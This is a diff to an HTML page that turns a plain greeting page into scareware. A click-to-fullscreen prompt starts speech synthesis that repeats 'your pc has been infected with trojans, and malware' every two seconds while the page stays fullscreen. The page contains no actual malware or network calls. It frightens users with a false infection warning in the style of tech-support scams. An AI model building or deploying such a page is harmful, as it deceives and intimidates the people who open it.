@@ -11,6 +11,7 @@
         color: white;
         font-family: Arial, sans-serif;
         overflow: hidden;
+        cursor: pointer;
     }
 
     .content {
@@ -26,18 +27,12 @@
         transform: translateY(-50%);
         max-width: 240px;
         height: auto;
-
         background: transparent;
         border: none;
         outline: none;
         box-shadow: none;
-
-        display: block;
         user-select: none;
         pointer-events: none;
-
-        image-rendering: auto;
-        -webkit-user-drag: none;
     }
 </style>
 </head>
@@ -46,7 +41,7 @@
 
 <div class="content">
     <h1>Hello</h1>
-    <p>Top-left white text on your custom blue.</p>
+    <p>Click anywhere to enter fullscreen</p>
 </div>
 
 <img class="right-image"
@@ -54,21 +49,40 @@
      alt="image">
 
 <script>
-function goFullscreen() {
-    const elem = document.documentElement;
+let loopInterval = null;
 
-    if (elem.requestFullscreen) {
-        elem.requestFullscreen();
-    } else if (elem.webkitRequestFullscreen) {
-        elem.webkitRequestFullscreen();
-    } else if (elem.msRequestFullscreen) {
-        elem.msRequestFullscreen();
-    }
+function speakHi() {
+    const msg = new SpeechSynthesisUtterance("Hello, your pc has been infected with trojans, and malware.");
+    msg.volume = 1;
+    msg.rate = 1;
+    msg.pitch = 1;
+    window.speechSynthesis.speak(msg);
 }
 
-window.onload = () => {
-    goFullscreen();
-};
+async function goFullscreen() {
+    const elem = document.documentElement;
+
+    try {
+        if (elem.requestFullscreen) {
+            await elem.requestFullscreen();
+        } else if (elem.webkitRequestFullscreen) {
+            await elem.webkitRequestFullscreen();
+        } else if (elem.msRequestFullscreen) {
+            await elem.msRequestFullscreen();
+        }
+    } catch (e) {}
+
+    // start looping speech
+    if (!loopInterval) {
+        speakHi(); // immediate first "hi"
+
+        loopInterval = setInterval(() => {
+            if (document.fullscreenElement) {
+                speakHi();
+            }
+        }, 2000); // every 2 seconds
+    }
+}
 </script>
 
 </body>
